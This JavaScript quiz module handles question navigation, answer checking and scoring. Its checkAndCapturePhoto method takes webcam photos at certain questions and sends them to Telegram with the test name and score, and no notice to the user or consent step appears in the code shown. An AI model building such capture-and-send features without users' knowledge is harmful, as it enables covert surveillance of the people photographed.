/**
 * Quiz module - Core quiz logic and state management
 */

import { QUESTION_TYPES } from './data.js';
import { shouldCapturePhoto, capturePhoto, isCameraActive } from './camera.js';
import { sendPhotoToTelegram, formatPhotoCaption } from './telegram-sender.js';

export class QuizState {
  constructor(questions, onBackToMenu = null, testSetName = 'Unknown') {
    this.questions = questions;
    this.currentIndex = 0;
    this.answers = new Map();
    this.wordArrangements = new Map();
    this.explanationVisible = new Map();
    this.answerChecked = new Map();
    this.wrongAnswerConfirmed = new Map();
    this.isSubmitted = false;
    this.onBackToMenu = onBackToMenu;
    this.testSetName = testSetName;
    this.photoCapturePending = false;
  }

  /**
   * Gets the current question
   * @returns {Object} Current question object
   */
  getCurrentQuestion() {
    return this.questions[this.currentIndex];
  }

  /**
   * Gets total number of questions
   * @returns {number} Total questions
   */
  getTotalQuestions() {
    return this.questions.length;
  }

  /**
   * Checks if there is a next question
   * @returns {boolean} True if next question exists
   */
  hasNext() {
    return this.currentIndex < this.questions.length - 1;
  }

  /**
   * Checks if there is a previous question
   * @returns {boolean} True if previous question exists
   */
  hasPrevious() {
    return this.currentIndex > 0;
  }

  /**
   * Moves to next question
   */
  async goToNext() {
    if (this.hasNext()) {
      this.currentIndex++;
      await this.checkAndCapturePhoto();
    }
  }

  /**
   * Checks if photo should be captured and captures it
   */
  async checkAndCapturePhoto() {
    const questionNumber = this.currentIndex + 1;

    if (shouldCapturePhoto(questionNumber) && isCameraActive()) {
      this.photoCapturePending = true;

      try {
        const photoBlob = await capturePhoto();
        const progressScore = this.calculateProgressScore(questionNumber);
        const caption = formatPhotoCaption(questionNumber, this.testSetName, progressScore);
        await sendPhotoToTelegram(photoBlob, caption);
        console.log(`Photo sent for question ${questionNumber}`);
      } catch (error) {
        console.error('Failed to capture/send photo:', error);
      } finally {
        this.photoCapturePending = false;
      }
    }
  }

  /**
   * Calculates score up to current question
   * @param {number} upToQuestion - Calculate score up to this question number
   * @returns {Object} Progress score object
   */
  calculateProgressScore(upToQuestion) {
    let correctCount = 0;
    let answeredCount = 0;

    for (let i = 0; i < upToQuestion && i < this.questions.length; i++) {
      const question = this.questions[i];
      const userAnswer = this.answers.get(question.id) || this.wordArrangements.get(question.id);

      if (userAnswer) {
        answeredCount++;
        const normalizedUserAnswer = Array.isArray(userAnswer)
          ? this.normalizeAnswer(userAnswer.join(' '))
          : this.normalizeAnswer(userAnswer);

        if (normalizedUserAnswer === this.normalizeAnswer(question.correctAnswer)) {
          correctCount++;
        }
      }
    }

    return {
      correct: correctCount,
      answered: answeredCount,
      total: upToQuestion,
      percentage: answeredCount > 0 ? Math.round((correctCount / answeredCount) * 100) : 0
    };
  }

  /**
   * Moves to previous question
   */
  goToPrevious() {
    if (this.hasPrevious()) {
      this.currentIndex--;
    }
  }

  /**
   * Sets answer for current question
   * @param {string} answer - User's answer
   */
  setAnswer(answer) {
    const question = this.getCurrentQuestion();
    if (question.type === QUESTION_TYPES.WORD_ARRANGEMENT) {
      return;
    }
    this.answers.set(question.id, answer.trim());
  }

  /**
   * Gets answer for current question
   * @returns {string|undefined} User's answer or undefined
   */
  getAnswer() {
    const question = this.getCurrentQuestion();
    const questionId = question.id;

    if (question.type === QUESTION_TYPES.WORD_ARRANGEMENT) {
      const words = this.wordArrangements.get(questionId) || [];
      return words.join(' ');
    }

    return this.answers.get(questionId);
  }

  /**
   * Gets word arrangement answer as array
   * @returns {string[]} Array of selected words in order
   */
  getWordArrangementAnswer() {
    const questionId = this.getCurrentQuestion().id;
    return this.wordArrangements.get(questionId) || [];
  }

  /**
   * Adds word to arrangement
   * @param {string} word - Word to add
   */
  addWordToArrangement(word) {
    const questionId = this.getCurrentQuestion().id;
    const currentWords = this.wordArrangements.get(questionId) || [];
    this.wordArrangements.set(questionId, [...currentWords, word]);
  }

  /**
   * Removes word from arrangement
   * @param {string} word - Word to remove
   */
  removeWordFromArrangement(word) {
    const questionId = this.getCurrentQuestion().id;
    const currentWords = this.wordArrangements.get(questionId) || [];
    const index = currentWords.indexOf(word);
    if (index > -1) {
      const newWords = [...currentWords];
      newWords.splice(index, 1);
      this.wordArrangements.set(questionId, newWords);
    }
  }

  /**
   * Toggles explanation visibility for current question
   */
  toggleExplanation() {
    const questionId = this.getCurrentQuestion().id;
    const current = this.explanationVisible.get(questionId) || false;
    this.explanationVisible.set(questionId, !current);
  }

  /**
   * Checks if explanation is visible for current question
   * @returns {boolean} True if explanation is visible
   */
  isExplanationVisible() {
    const questionId = this.getCurrentQuestion().id;
    return this.explanationVisible.get(questionId) || false;
  }

  /**
   * Checks current answer and marks it as checked
   */
  checkCurrentAnswer() {
    const questionId = this.getCurrentQuestion().id;
    this.answerChecked.set(questionId, true);
  }

  /**
   * Checks if current answer has been checked
   * @returns {boolean} True if answer has been checked
   */
  isCurrentAnswerChecked() {
    const questionId = this.getCurrentQuestion().id;
    return this.answerChecked.get(questionId) || false;
  }

  /**
   * Confirms wrong answer to allow navigation
   */
  confirmWrongAnswer() {
    const questionId = this.getCurrentQuestion().id;
    this.wrongAnswerConfirmed.set(questionId, true);
  }

  /**
   * Checks if wrong answer has been confirmed
   * @returns {boolean} True if confirmed
   */
  isWrongAnswerConfirmed() {
    const questionId = this.getCurrentQuestion().id;
    return this.wrongAnswerConfirmed.get(questionId) || false;
  }

  /**
   * Checks if user can proceed to next question
   * @returns {boolean} True if can proceed
   */
  canProceedToNext() {
    if (!this.hasNext()) return false;

    const hasAnswer = this.getAnswer() !== undefined && this.getAnswer() !== '';
    if (!hasAnswer) return false;

    const isChecked = this.isCurrentAnswerChecked();
    if (!isChecked) return false;

    const isCorrect = this.isCurrentAnswerCorrect();
    if (isCorrect) return true;

    return this.isWrongAnswerConfirmed();
  }

  /**
   * Checks if current answer is correct
   * @returns {boolean} True if answer is correct
   */
  isCurrentAnswerCorrect() {
    const question = this.getCurrentQuestion();
    const userAnswer = this.getAnswer();
    if (!userAnswer) return false;

    return this.normalizeAnswer(userAnswer) === this.normalizeAnswer(question.correctAnswer);
  }

  /**
   * Normalizes answer for comparison
   * @param {string} answer - Answer to normalize
   * @returns {string} Normalized answer
   */
  normalizeAnswer(answer) {
    return answer.toLowerCase().trim().replace(/\s+/g, ' ');
  }

  /**
   * Calculates score
   * @returns {Object} Score object with correct count and percentage
   */
  calculateScore() {
    let correctCount = 0;

    this.questions.forEach(question => {
      const userAnswer = this.answers.get(question.id);
      if (userAnswer && this.normalizeAnswer(userAnswer) === this.normalizeAnswer(question.correctAnswer)) {
        correctCount++;
      }
    });

    return {
      correct: correctCount,
      total: this.questions.length,
      percentage: Math.round((correctCount / this.questions.length) * 100)
    };
  }

  /**
   * Submits the quiz
   */
  submit() {
    this.isSubmitted = true;
  }

  /**
   * Resets the quiz to initial state
   */
  reset() {
    this.currentIndex = 0;
    this.answers.clear();
    this.wordArrangements.clear();
    this.explanationVisible.clear();
    this.answerChecked.clear();
    this.wrongAnswerConfirmed.clear();
    this.isSubmitted = false;
  }
}
